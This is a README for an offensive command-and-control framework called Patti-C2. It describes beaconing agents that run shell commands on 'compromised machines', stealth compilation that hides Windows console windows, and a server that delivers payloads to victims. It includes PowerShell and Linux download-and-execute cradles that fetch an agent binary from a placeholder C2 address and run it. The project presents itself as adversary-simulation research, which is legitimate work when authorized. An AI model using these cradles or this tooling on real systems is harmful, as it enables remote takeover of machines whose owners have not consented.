# Red Team Research C2 (Patti-C2)

A lightweight, cross-platform, asynchronous Command & Control (C2) framework designed for offensive security research and adversary simulation.

Built with **Go** (for the listener and agents) and **Python/Flask** (for the payload delivery and Web UI), this C2 framework provides a stealthy beaconing architecture with a modern, easy-to-use web interface.

## 🚀 Features

- **Asynchronous Beaconing**: Agents check in periodically to fetch tasks and post results, making the connection resilient to network drops and stealthier than a standard reverse shell.
- **Multi-Agent Support**: Each agent generates a unique UUID, allowing you to manage and target multiple compromised machines simultaneously.
- **Modern Web Dashboard**: A sleek, dark-themed UI built with Bootstrap to monitor payload delivery logs, view active agents, queue commands, and read execution results.
- **Dynamic Payload Generation**: Compile new custom 64-bit Windows (`.exe`) or Linux binaries on the fly directly from the Web UI.
- **Stealth Windows Execution**: Windows agents are compiled with `-ldflags "-H=windowsgui"` to prevent console pop-ups, and payload delivery is optimized for Living-off-the-Land (LotL) PowerShell cradles.
- **Payload Delivery Server**: Built-in endpoints to host your initial access vectors and dynamically generated payloads.

## 📁 Core Components

- **`server.go` (The Listener)**: The core C2 server running on port `8080`. It handles agent check-ins (`/tasks`), receives execution output (`/results`), tracks agent state (alive/dead), and provides REST APIs for the Web UI (including payload compilation).
- **`agent2.go` (The Beacon)**: The cross-platform payload template. It operates in an infinite loop, fetching commands from the server, executing them via the native OS shell (`cmd.exe` or `/bin/sh`), and posting the output back.
- **`app.py` (The Web Console & Delivery Host)**: A Flask application served via Gunicorn on port `80`. It provides the interactive dashboard and serves payloads to victim machines. 

## 🛠️ Installation & Setup

### Prerequisites
- **Go** (for compiling the listener and agents)
- **Python 3** and **pip**
- **Flask** and **Gunicorn** (`pip install flask gunicorn`)

### 1. Start the C2 Listener
Open a terminal and run the Go server. It will listen on port `8080` for both agent connections and API requests from the Web UI.
```bash
go run server.go
```

### 2. Start the Web Console & Delivery Host
Open a second terminal and run the Flask app via Gunicorn. Note: `sudo` is required to bind to port 80.
```bash
sudo gunicorn --bind 0.0.0.0:80 app:app
```

## 💻 Usage Guide

1. **Access the Dashboard**: Navigate to `http://<YOUR_C2_IP>/` in your web browser.
2. **Generate a Payload**: Go to the **Payload Creation** tab. Enter your C2 Server's IP address, select the target OS (Windows or Linux), provide a name, and click Generate.
3. **Deploy the Payload**: The UI will provide you with a Download Cradle URL. 
   - *Example Windows PowerShell Cradle:*
     ```powershell
     iwr -Uri http://<C2_IP>/get/payload/update.exe -OutFile $env:TEMP\update.exe; Start-Process $env:TEMP\update.exe
     ```
   - *Example Linux Cradle:*
     ```bash
     wget http://<C2_IP>/get/payload/linux_agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent &
     ```
4. **Control Agents**: Return to the **C2 Dashboard** tab. Your newly executed agent will appear in the "Active Agents" list. Click on an agent to target it exclusively, or select "ALL AGENTS" to broadcast commands.
5. **Terminate Sessions**: Click the **Kill** button next to an agent to cleanly terminate its process. Once marked dead (🔴), you can clear it from the UI.

## ⚠️ Disclaimer

This project is developed for **educational purposes and authorized offensive security research only**. Ensure you have explicit permission before deploying this software against any network or system. The developers assume no liability for misuse.
